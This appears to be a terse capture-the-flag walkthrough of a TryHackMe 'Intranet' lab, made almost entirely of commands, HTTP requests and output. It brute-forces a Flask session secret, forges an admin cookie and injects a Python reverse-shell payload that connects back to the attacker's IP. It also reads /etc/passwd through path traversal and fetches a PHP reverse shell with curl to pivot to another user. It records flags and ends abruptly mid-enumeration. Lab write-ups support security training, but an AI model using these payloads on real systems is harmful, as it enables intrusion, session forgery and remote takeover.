```



```bash
:~/Intranet# python3 -m pip install --upgrade pip
```

```bash
:~/Intranet# pip3 install flask-unsign
```

```bash
:~/Intranet# pip3 install blinker==1.5
```

```bash
:~/Intranet# echo 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aN1NTg.wj8ABWJCK5uSDPyexxkuF718-94' > session.cookie.txt
```

```bash
:~/Intranet# for i in $(seq 100000 999999); do echo "secret_key_$i"; done > possibilities.txt
```

```bash
:~/Intranet# head -n 4 possibilities.txt
secret_key_100000
secret_key_100001
secret_key_100002
secret_key_100003
```

```bash
:~/Intranet# flask-unsign --unsign --cookie "$(cat session.cookie.txt)" --wordlist possibilities.txt
[*] Session decodes to: {'logged_in': True, 'username': 'anders'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 223872 attempts
'secret_key_323784'
```


```bash
:~/Intranet# flask-unsign --unsign --sign --cookie '{"logged_in": true, "username": "admin"}' --secret 'secret_key_323784'
IntcImxvZ2dlZF9pblwiOiB0cnVlLCBcInVzZXJuYW1lXCI6IFwiYWRtaW5cIn0i.aN1S7g.t-3_bw3U-Kik9bcL6lPyUZq6Wms
```

```bash
:~/Intranet# flask-unsign --unsign --sign --cookie '{"logged_in": True, "username": "admin"}' --secret 'secret_key_323784'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aN1TIg.LqAuqWsg9sat6UZbV4ycja_2mVk
```


<img width="1265" height="309" alt="image" src="https://github.com/user-attachments/assets/059a69b9-26be-460d-919f-9ac70f3106de" />

<br>
<br>
<br>

```bash
POST /internal HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://intranet.thm:8080/internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://intranet.thm:8080
Connection: keep-alive
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aN1TIg.LqAuqWsg9sat6UZbV4ycja_2mVk
Upgrade-Insecure-Requests: 1
Priority: u=0, i

news=latest
```


```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 01 Oct 2025 16:15:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1684
Vary: Cookie
Connection: close


<!DOCTYPE html>
...
</form>
    
    
      No more news today!
Please check again later.
```


<p>Admin dashboad</p>

<p>1.4. What is the fourth web application flag?<br>
<code>THM{4f3f2ebe2cec24589d4140e484b0ecd1}</code>Flag</p>

<img width="1273" height="479" alt="image" src="https://github.com/user-attachments/assets/2e4900e3-07c8-4c36-a8e6-f6e3515c07d2" />

<br>
<br>
<br>

```bash
root@ip-10-201-41-112:~/Intranet# nc -nlvp 1234
Listening on 0.0.0.0 1234
```


```bash
POST /admin HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://intranet.thm:8080/internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://intranet.thm:8080
Connection: keep-alive
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aN1TIg.LqAuqWsg9sat6UZbV4ycja_2mVk
Upgrade-Insecure-Requests: 1
Priority: u=0, i

debug=%2Fusr%2Fbin%2Fpython3%20%2Dc%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%2210%2E201%2E41%2E112%22%2C1234%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3Bos%2Edup2%28s%2Efileno%28%29%2C1%29%3Bos%2Edup2%28s%2Efileno%28%29%2C2%29%3Bpty%2Espawn%28%22%2Fbin%2Fsh%22%29%27
```



```bash
:~/Intranet# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.0.156 44834
$ id
id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
$ pwd
pwd
/home/devops
$ which python3
which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
devops@ip-10-201-0-156:~$ ^Z
[1]+  Stopped                 nc -nlvp 1234
:~/Intranet# stty raw -echo; fg
nc -nlvp 1234

devops@ip-10-201-0-156:~$ export TERM=xterm
devops@ip-10-201-0-156:~$ 
```

<p>1.5. What is the user.txt flag?<br>
<code>THM{79445fbd3ed0b87ae248fc01a44a06fd}</code></p>

```bash
devops@ip-10-201-0-156:~$ export TERM=xterm
devops@ip-10-201-0-156:~$ pwd
/home/devops
devops@ip-10-201-0-156:~$ ls -lah
total 44K
drwxr-xr-x 5 devops devops 4.0K Mar 24  2023 .
drwxr-xr-x 5 root   root   4.0K Oct  1 15:32 ..
-rw-rw-r-- 1 devops devops 6.6K Mar 24  2023 app.py
lrwxrwxrwx 1 root   root      9 Oct 16  2022 .bash_history -> /dev/null
-rw-r--r-- 1 devops devops  220 Oct 16  2022 .bash_logout
-rw-r--r-- 1 devops devops 3.7K Oct 16  2022 .bashrc
drwxrwxr-x 3 devops devops 4.0K Oct 16  2022 .cache
drwx------ 4 devops devops 4.0K Oct 16  2022 .local
-rw-r--r-- 1 devops devops  807 Oct 16  2022 .profile
drwxrwxr-x 2 devops devops 4.0K Mar 24  2023 templates
-rw-r--r-- 1 root   root     38 Mar 24  2023 user.txt
devops@ip-10-201-0-156:~$ cat user.txt
THM{79445fbd3ed0b87ae248fc01a44a06fd}
```

```bash
devops@ip-10-201-0-156:~$ cd /var/www/html
devops@ip-10-201-0-156:/var/www/html$ ls -lah
total 12K
drwxrwxrwx 2 root root 4.0K Nov  7  2022 .
drwxr-xr-x 3 root root 4.0K Oct 16  2022 ..
-rw-r--r-- 1 root root  111 Nov  7  2022 index.html
```

<br>
<h2 align="center">external</h2>
<p>

- external@securesolacoders.io</p>

<img width="1267" height="214" alt="image" src="https://github.com/user-attachments/assets/7ba68ae2-d50f-4f35-8114-daa11822eb14" />

<br>
<h2 align="center">Update</h2>
<p>

- news=latest</p>

<img width="1349" height="282" alt="image" src="https://github.com/user-attachments/assets/b383f823-62cf-4fc6-bb30-28db12243df2" />

```bash
POST /internal HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://intranet.thm:8080/internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://intranet.thm:8080
Connection: keep-alive
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aN1TIg.LqAuqWsg9sat6UZbV4ycja_2mVk
Upgrade-Insecure-Requests: 1
Priority: u=0, i

news=../../../../etc/passwd
```


```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 01 Oct 2025 16:34:19 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3742
Vary: Cookie
Connection: close


<!DOCTYPE html>
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
anders:x:1000:1000:anders:/home/anders:/bin/bash
devops:x:1001:1001:,,,:/home/devops:/bin/bash
telnetd:x:113:118::/nonexistent:/usr/sbin/nologin
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:115:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```
    





```bash
POST /internal HTTP/1.1
Host: intranet.thm:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://intranet.thm:8080/internal
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://intranet.thm:8080
Connection: keep-alive
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.aN1TIg.LqAuqWsg9sat6UZbV4ycja_2mVk
Upgrade-Insecure-Requests: 1
Priority: u=0, i

news=../../../../var/www/html/index.html
```


```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.8.10
Date: Wed, 01 Oct 2025 16:36:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1761
Vary: Cookie
Connection: close


<!DOCTYPE html>
...<ul>
  <li><a href="/home">Home</a></li>
  <li><a class="active" href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a href="/admin">Admin</a></li>
  <li><a href="/logout">Log Out</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>Internal news feed</h2>
  <br><h3>1. New features</h3>
  <p>As many of you may be aware of, we are still working on the application.<br>
  Please be patient, as new features will be implemented according to the business plan.</p><br>
  <h3>2. Developers</h3>
  <p>We are currently hiring new developers! Know someone who is skilled with:<br>
  - PHP (yes, we know, we know...)<br>
  - Pascal<br>
  - JavaScript<br>
  - Python<br>
  - Perl<br><br>
  Then please give us a tip at hiring@securesolacoders.no. We are offering recruitment bonuses.</p><br>
  <p><br>Any cool news we should know about? Contact us!</p>
  <p>internal@securesolacoders.no</p><br>

<form action="/internal" method="POST">
    <h4>Update news feed</h4>
    <button type="submit" name="news" id="news" value="latest">Update</button>
  
</form>
    
    
      &lt;h3&gt;Currently under construction&lt;/h3&gt;
We are working on a new web application.

Sincerely,
SecureSolaCoders.no

    
    </div>

</body>
</html>
```















```bash
devops@ip-10-201-0-156:~$ ps aux | grep anders
anders       924  0.0  0.4 193896  7984 ?        S    15:32   0:00 /usr/sbin/apache2 -k start
anders       927  0.0  0.4 193896  7984 ?        S    15:32   0:00 /usr/sbin/apache2 -k start
anders       928  0.0  0.4 193896  7984 ?        S    15:32   0:00 /usr/sbin/apache2 -k start
anders       929  0.0  0.4 193896  7984 ?        S    15:32   0:00 /usr/sbin/apache2 -k start
anders       942  0.0  0.4 193896  7984 ?        S    15:32   0:00 /usr/sbin/apache2 -k start
devops     48892  0.0  0.0   6440   720 pts/1    S+   16:27   0:00 grep --color=auto anders
```




```bash
devops@ip-10-201-0-156:~$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/1695/usr/bin/chfn
/snap/core20/1695/usr/bin/chsh
/snap/core20/1695/usr/bin/gpasswd
/snap/core20/1695/usr/bin/mount
/snap/core20/1695/usr/bin/newgrp
/snap/core20/1695/usr/bin/passwd
/snap/core20/1695/usr/bin/su
/snap/core20/1695/usr/bin/sudo
/snap/core20/1695/usr/bin/umount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
/snap/core20/1852/usr/bin/chfn
/snap/core20/1852/usr/bin/chsh
/snap/core20/1852/usr/bin/gpasswd
/snap/core20/1852/usr/bin/mount
/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1695/usr/lib/openssh/ssh-keysign
/snap/core20/1852/usr/bin/chfn
/snap/core20/1852/usr/bin/chsh
/snap/core20/1852/usr/bin/gpasswd
/snap/core20/1852/usr/bin/mount
/snap/core20/1852/usr/bin/newgrp
/snap/core20/1852/usr/bin/passwd
/snap/core20/1852/usr/bin/su
/snap/core20/1852/usr/bin/sudo
/snap/core20/1852/usr/bin/umount
/snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1852/usr/lib/openssh/ssh-keysign
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/snapd/18596/usr/lib/snapd/snap-confine
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/at
/usr/bin/fusermount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/telnetlogin
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
```



```bash
:~/Intranet# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
devops@ip-10-201-0-156:~$ curl http://10.201.41.112:8000/rev.php -o rev.php
```


```bash
:~/Intranet# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.0.156 - - [01/Oct/2025 17:38:13] "GET /rev.php HTTP/1.1" 200 -
```


```bash
http://intranet.thm/rev.php
```

```bash
:~/Intranet# nc -nlvp 9001
Listening on 0.0.0.0 9001
```



```bash
devops@ip-10-201-0-156:~$ ls -lah /home/anders
ls: cannot open directory '/home/anders': Permission denied
```


```bash
devops@ip-10-201-0-156:/home/ubuntu$ ls -lah
total 24K
drwxr-xr-x 3 ubuntu ubuntu 4.0K Oct  1 15:32 .
drwxr-xr-x 5 root   root   4.0K Oct  1 15:32 ..
-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3.7K Feb 25  2020 .bashrc
-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
drwx------ 2 ubuntu ubuntu 4.0K Oct  1 15:32 .ssh
```

```bash
devops@ip-10-201-0-156:~$ ls -lah /home/ubuntu/.ssh
ls: cannot open directory '/home/ubuntu/.ssh': Permission denied
```





```bash
@ip-10-201-41-112:~/Intranet# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.201.0.156 46918
Linux ip-10-201-0-156 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 16:47:26 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
$ whoami
anders
$ hostname
ip-10-201-0-156
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

anders@ip-10-201-0-156:/$ pwd
pwd
/
anders@ip-10-201-0-156:/$ cd /home/anders
cd /home/anders
anders@ip-10-201-0-156:/home/anders$ ls
ls
user2.txt
anders@ip-10-201-0-156:/home/anders$ cat user2.txt
cat user2.txt
THM{5c8f3b3bcbeeecded0f2541daf15a57c}
```


```bash
anders@ip-10-201-0-156:/home/anders$ sudo -l
sudo -l
Matching Defaults entries for anders on ip-10-201-0-156:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anders may run the following commands on ip-10-201-0-156:
    (ALL) NOPASSWD: /sbin/service apache2 restart
anders@ip-10-201-0-156:/home/anders$ sudo /sbin/service apach2 restart
```



```bash
anders@ip-10-201-0-156:/home/anders$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;   
< -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 85064 Mar 14  2022 /snap/core20/1695/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Mar 14  2022 /snap/core20/1695/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7  2022 /snap/core20/1695/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Mar 14  2022 /snap/core20/1695/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Mar 14  2022 /snap/core20/1695/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /snap/core20/1695/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 19  2021 /snap/core20/1695/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7  2022 /snap/core20/1695/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 85064 Nov 29  2022 /snap/core20/1852/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29  2022 /snap/core20/1852/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Nov 29  2022 /snap/core20/1852/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Feb  7  2022 /snap/core20/1852/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29  2022 /snap/core20/1852/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29  2022 /snap/core20/1852/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  7  2022 /snap/core20/1852/usr/bin/su
-rwsr-xr-x 1 root root 166056 Jan 16  2023 /snap/core20/1852/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Feb  7  2022 /snap/core20/1852/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 473576 Mar 30  2022 /snap/core20/1852/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 180752 Jan 17  2025 /snap/snapd/23771/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 123560 Feb 22  2023 /snap/snapd/18596/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /usr/bin/mount
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /usr/bin/su
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /usr/bin/umount
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root telnetd 14744 Mar 23  2020 /usr/lib/telnetlogin
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 159304 Jan 15  2025 /usr/lib/snapd/snap-confine
```



```bash
anders@ip-10-201-0-156:/home/anders$ ps aux | grep root
ps aux | grep root
root           1  0.0  0.6 105640 12916 ?        Ss   15:32   0:02 /sbin/init maybe-ubiquity
root           2  0.0  0.0      0     0 ?        S    15:32   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   15:32   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   15:32   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   15:32   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   15:32   0:00 [netns]
root           8  0.0  0.0      0     0 ?        I<   15:32   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   15:32   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        S    15:32   0:00 [rcu_tasks_rude_]
root          12  0.0  0.0      0     0 ?        S    15:32   0:00 [rcu_tasks_trace]
root          13  0.0  0.0      0     0 ?        S    15:32   0:00 [ksoftirqd/0]
root          14  0.0  0.0      0     0 ?        I    15:32   0:00 [rcu_sched]
root          15  0.0  0.0      0     0 ?        S    15:32   0:00 [migration/0]
root          16  0.0  0.0      0     0 ?        S    15:32   0:00 [idle_inject/0]
root          17  0.0  0.0      0     0 ?        I    15:32   0:00 [kworker/0:1-cgroup_destroy]
root          18  0.0  0.0      0     0 ?        S    15:32   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    15:32   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    15:32   0:00 [idle_inject/1]
root          21  0.0  0.0      0     0 ?        S    15:32   0:00 [migration/1]
root          22  0.0  0.0      0     0 ?        S    15:32   0:00 [ksoftirqd/1]
root          24  0.0  0.0      0     0 ?        I<   15:32   0:00 [kworker/1:0H-events_highpri]
root          25  0.0  0.0      0     0 ?        S    15:32   0:00 [kdevtmpfs]
root          26  0.0  0.0      0     0 ?        I<   15:32   0:00 [inet_frag_wq]
root          27  0.0  0.0      0     0 ?        S    15:32   0:00 [kauditd]
root          29  0.0  0.0      0     0 ?        S    15:32   0:00 [khungtaskd]
root          30  0.0  0.0      0     0 ?        S    15:32   0:00 [oom_reaper]
root          31  0.0  0.0      0     0 ?        I<   15:32   0:00 [writeback]
root          32  0.0  0.0      0     0 ?        S    15:32   0:00 [kcompactd0]
root          33  0.0  0.0      0     0 ?        SN   15:32   0:00 [ksmd]
root          34  0.0  0.0      0     0 ?        SN   15:32   0:00 [khugepaged]
root          80  0.0  0.0      0     0 ?        I<   15:32   0:00 [kintegrityd]
root          81  0.0  0.0      0     0 ?        I<   15:32   0:00 [kblockd]
root          82  0.0  0.0      0     0 ?        I<   15:32   0:00 [blkcg_punt_bio]
root          83  0.0  0.0      0     0 ?        I<   15:32   0:00 [tpm_dev_wq]
root          84  0.0  0.0      0     0 ?        I<   15:32   0:00 [ata_sff]
root          85  0.0  0.0      0     0 ?        I<   15:32   0:00 [md]
root          86  0.0  0.0      0     0 ?        I<   15:32   0:00 [edac-poller]
root          87  0.0  0.0      0     0 ?        I<   15:32   0:00 [devfreq_wq]
root          88  0.0  0.0      0     0 ?        S    15:32   0:00 [watchdogd]
root          90  0.0  0.0      0     0 ?        I<   15:32   0:00 [kworker/0:1H-kblockd]
root          92  0.0  0.0      0     0 ?        S    15:32   0:00 [kswapd0]
root          93  0.0  0.0      0     0 ?        S    15:32   0:00 [ecryptfs-kthrea]
root          95  0.0  0.0      0     0 ?        I<   15:32   0:00 [kthrotld]
root          96  0.0  0.0      0     0 ?        I<   15:32   0:00 [acpi_thermal_pm]
root          98  0.0  0.0      0     0 ?        I<   15:32   0:00 [vfio-irqfd-clea]
root         100  0.0  0.0      0     0 ?        I<   15:32   0:00 [mld]
root         101  0.0  0.0      0     0 ?        I<   15:32   0:00 [ipv6_addrconf]
root         110  0.0  0.0      0     0 ?        I<   15:32   0:00 [kstrp]
root         113  0.0  0.0      0     0 ?        I<   15:32   0:00 [zswap-shrink]
root         114  0.0  0.0      0     0 ?        I<   15:32   0:00 [kworker/u5:0]
root         119  0.0  0.0      0     0 ?        I<   15:32   0:00 [charger_manager]
root         159  0.0  0.0      0     0 ?        I<   15:32   0:00 [ena]
root         160  0.0  0.0      0     0 ?        I<   15:32   0:00 [nvme-wq]
root         161  0.0  0.0      0     0 ?        I<   15:32   0:00 [cryptd]
root         162  0.0  0.0      0     0 ?        I<   15:32   0:00 [nvme-reset-wq]
root         163  0.0  0.0      0     0 ?        I<   15:32   0:00 [nvme-delete-wq]
root         173  0.0  0.0      0     0 ?        I<   15:32   0:00 [kworker/1:1H-kblockd]
root         226  0.0  0.0      0     0 ?        I<   15:32   0:00 [kdmflush]
root         256  0.0  0.0      0     0 ?        I<   15:32   0:00 [raid5wq]
root         308  0.0  0.0      0     0 ?        S    15:32   0:00 [jbd2/dm-0-8]
root         309  0.0  0.0      0     0 ?        I<   15:32   0:00 [ext4-rsv-conver]
root         385  0.0  0.7  52164 15700 ?        S<s  15:32   0:00 /lib/systemd/systemd-journald
root         421  0.0  0.2   9916  5628 ?        Ss   15:32   0:00 /lib/systemd/systemd-udevd
root         538  0.0  0.0      0     0 ?        I<   15:32   0:00 [kaluad]
root         539  0.0  0.0      0     0 ?        I<   15:32   0:00 [kmpath_rdacd]
root         540  0.0  0.0      0     0 ?        I<   15:32   0:00 [kmpathd]
root         541  0.0  0.0      0     0 ?        I<   15:32   0:00 [kmpath_handlerd]
root         542  0.0  0.9 280144 17952 ?        SLsl 15:32   0:00 /sbin/multipathd -d -s
root         561  0.0  0.0      0     0 ?        S    15:32   0:00 [jbd2/nvme0n1p2-]
root         562  0.0  0.0      0     0 ?        I<   15:32   0:00 [ext4-rsv-conver]
root         706  0.0  0.3 235584  7268 ?        Ssl  15:32   0:00 /usr/lib/accountsservice/accounts-daemon
root         707  0.0  0.8 1307140 16668 ?       Ssl  15:32   0:00 /usr/bin/amazon-ssm-agent
root         714  0.0  0.1   6824  2932 ?        Ss   15:32   0:00 /usr/sbin/cron -f
root         721  0.0  0.1   8492  3416 ?        S    15:32   0:00 /usr/sbin/CRON -f
root         728  0.0  0.1  81836  3672 ?        Ssl  15:32   0:00 /usr/sbin/irqbalance --foreground
root         729  0.0  0.9  29672 18744 ?        Ss   15:32   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         732  0.0  0.3 232736  6780 ?        Ssl  15:32   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         745  0.0  1.5 1321252 30700 ?       Ssl  15:32   0:00 /usr/lib/snapd/snapd
root         750  0.0  0.3  17244  7392 ?        Ss   15:32   0:00 /lib/systemd/systemd-logind
root         755  0.0  0.6 393276 12208 ?        Ssl  15:32   0:00 /usr/lib/udisks2/udisksd
root         766  0.0  0.1   6816  3028 ?        Ss   15:32   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root         774  0.0  0.1   5608  2240 ttyS0    Ss+  15:32   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root         780  0.0  0.0   5836  1828 tty1     Ss+  15:32   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root         812  0.0  0.5 315124 11256 ?        Ssl  15:32   0:00 /usr/sbin/ModemManager
root         815  0.0  0.3  12196  7268 ?        Ss   15:32   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
